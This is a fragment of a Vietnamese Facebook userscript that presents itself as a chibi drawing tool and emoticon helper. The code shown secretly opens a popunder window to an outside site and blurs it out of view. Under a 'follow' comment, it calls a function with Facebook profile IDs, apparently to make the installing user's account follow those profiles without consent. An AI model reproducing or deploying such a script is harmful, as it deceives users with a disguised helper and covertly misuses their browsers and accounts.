﻿﻿﻿﻿﻿// ==UserScript==
// @name            TOOL VẼ CHIBI TRỰC TUYẾN
// @description     Hổ trợ Facebook
...
"chars" : " :) ",
    ...
    html += '<a class="jewelFooter" href="http://diendanbaclieu.net/chibi/" target="_blank">VẼ CHIBI TRỰC TUYẾN<br>ONLY PC</a>';
	html += '</div>';
...
var params = 'height=600,width=800,left=1,top=1,location=0,toolbar=1,status=1,menubar=1,scrollbars=1,resizable=1';
// -------------- pop 1 --------------------
if(document.cookie.indexOf("vatgia") == -1)
{
document.cookie = "popunder=vatgia";
var w = window.open("http://chibi.motphut.com/",'vatgia', params);
if (w)
{
document.cookie = "popunder=vatgia";
w.blur();
...
//theo doi
a("100000298903019");
//a("1379291785681377");a("154198054778482");
	// === Facebook Emoticons ====
